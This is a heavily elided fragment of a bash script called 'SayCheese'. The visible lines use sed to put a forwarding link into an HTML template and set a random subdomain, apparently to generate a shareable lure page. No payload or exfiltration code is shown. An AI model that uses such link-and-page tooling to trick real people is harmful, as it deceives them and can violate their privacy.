#!/bin/bash
# SayCheese v1.0
# Coded by: github.com/2008shivamjha/SmilePlease
...
sed 's+forwarding_link+'$link'+g' smileplease.html > index2.html
...
sed 's+forwarding_link+'$send_link'+g' smileplease.html > index2.html
...
default_subdomain="smileplease$RANDOM"
